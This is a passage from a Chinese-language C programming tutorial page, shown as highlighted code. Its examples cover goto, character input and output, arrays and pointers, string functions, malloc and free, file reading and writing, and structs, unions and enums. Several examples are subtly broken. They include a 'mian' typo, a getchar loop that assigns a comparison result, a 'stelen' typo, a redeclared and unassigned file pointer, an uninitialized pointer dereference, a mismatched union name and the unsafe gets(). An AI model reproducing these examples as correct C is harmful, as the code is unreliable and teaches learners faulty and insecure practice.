punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token comment">//goto 语句会破坏程序的执行结构</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    loop<span class="token operator">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">goto</span> loop<span class="token punctuation">;</span><span class="token comment">// 跳到 loop 继续执行</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="字符的输入输出"><a class="anchor" href="#字符的输入输出">#</a> 字符的输入输出</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">mian</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//getchar</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//putchar</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">char</span> str<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'#'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token function">putchar</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* code */</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="数组和指针"><a class="anchor" href="#数组和指针">#</a> 数组和指针</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">// 数组：一组类型的变量所组成的集合</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//number [0] 首元素</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//number [9] 最后一个元素</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> number<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 一维数组</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">// 多维数组</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">int</span> number1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 相当于三个 5 元素的一维数组</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        number1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    </pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment">// 指针</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment">//&amp; 取地址运算符</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token comment">//* 间接运算符</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">//&amp; 变量名</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">int</span> number2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">int</span> <span class="token operator">*</span> pnum <span class="token operator">=</span> <span class="token operator">&amp;</span>number2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token operator">*</span>pnum <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">// 指针地址 +1 = 加一个类型长度</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token comment">// 指针地址 + sizeof (int);</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"变量number2的值和地址是：%d, %x"</span><span class="token punctuation">,</span>number2<span class="token punctuation">,</span><span class="token operator">&amp;</span>number2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="字符串和字符串函数"><a class="anchor" href="#字符串和字符串函数">#</a> 字符串和字符串函数</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">//gets puts</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">char</span> szStr<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"My name is 21r000"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">char</span> szStr1<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">gets</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment">//fgets fputs</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">char</span> szStr2<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token function">fgets</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token function">fputs</span><span class="token punctuation">(</span>szStr2<span class="token punctuation">,</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment">//strcat</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">char</span> szStr3<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"hello"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">strcat</span><span class="token punctuation">(</span>szStr<span class="token punctuation">,</span>szStr3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 拼接字符串</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">strncat</span><span class="token punctuation">(</span>szStr<span class="token punctuation">,</span>szStr3<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">//strcmp</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">strcmp</span><span class="token punctuation">(</span>szStr<span class="token punctuation">,</span>szStr3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 判断</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="储存类-链接和内存管理"><a class="anchor" href="#储存类-链接和内存管理">#</a> 储存类、、链接和内存管理</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> c<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">char</span> szStr<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"My name is 21r000"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span> szStr1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>szStr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    szStr1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 申请内存</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">memset</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">strcpy</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">,</span>szStr<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">free</span><span class="token punctuation">(</span>szStr1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//free 释放</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">// 静态储存时期</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token comment">// 自动储存时期</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token comment">// 寄存器 register</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">// 具有外部链接的静态存储类 extern</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">// 具有内部链接的静态储存类 static</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// 空连接的静态储存类 static</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">// malloc free</span></pre></td></tr></table></figure><h2 id="文件操作"><a class="anchor" href="#文件操作">#</a> 文件操作</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token comment">// 读取</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    FILE <span class="token operator">*</span> pFile<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span> szReadTextBuffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> nReadFileSize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">int</span> nReadRetsize<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">//r 读取，w 写出，b 二进制</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Open file failed！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    nReadFileSize <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    szReadTextBuffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>nReadFileSize <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>szReadTextBuffer <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"malloc memory failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token function">memset</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>nReadFileSize <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    nReadRetsize <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>nReadFileSize<span class="token punctuation">,</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>nReadRetsize <span class="token operator">!=</span> nReadFileSize<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Read file failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token function">puts</span><span class="token punctuation">(</span>szReadTextBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token function">fclose</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">// 写出</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span> szWriteBuffer <span class="token operator">=</span> <span class="token string">"21r000"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">int</span> nWriteSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    FILE <span class="token operator">*</span> pFile<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test1.txt"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>pFile <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token function">fwrite</span><span class="token punctuation">(</span>szWriteBuffer<span class="token punctuation">,</span><span class="token function">stelen</span><span class="token punctuation">(</span>szWriteBuffer<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token function">fclose</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="结构体-联合体和枚举类型"><a class="anchor" href="#结构体-联合体和枚举类型">#</a> 结构体、联合体和枚举类型</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">GamePlayerInfo</span> <span class="token comment">// 结构体</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">char</span> PlayerName<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> HP<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> MP<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">float</span> x<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">float</span> y<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">float</span> z<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">union</span> info <span class="token comment">// 联合体</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">char</span> PlayName<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> MP<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">float</span> x<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">GamePlayerInfo</span> <span class="token operator">*</span> p<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token comment">//p->PlayName</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">//(*p).PlayerName</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>PlayerName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">union</span> Info MyInfo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token function">strcpy</span><span class="token punctuation">(</span>MyInfo<span class="token punctuation">.</span>PlayName<span class="token punctuation">,</span><span class="token string">"NPC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n%d\n%f\n"</span><span class="token punctuation">,</span>MyInfo<span class="token punctuation">.</span>PlayName<span class="token punctuation">,</span>MyInfo<span class="token punctuation">.</span>MP<span class="token punctuation">,</span>MyInfo<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">enum</span> <span class="token class-name">color</span> <span class="token punctuation">&#123;</span>red<span class="token punctuation">,</span>blue<span class="token punctuation">,</span>green<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 枚举</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>flag<span 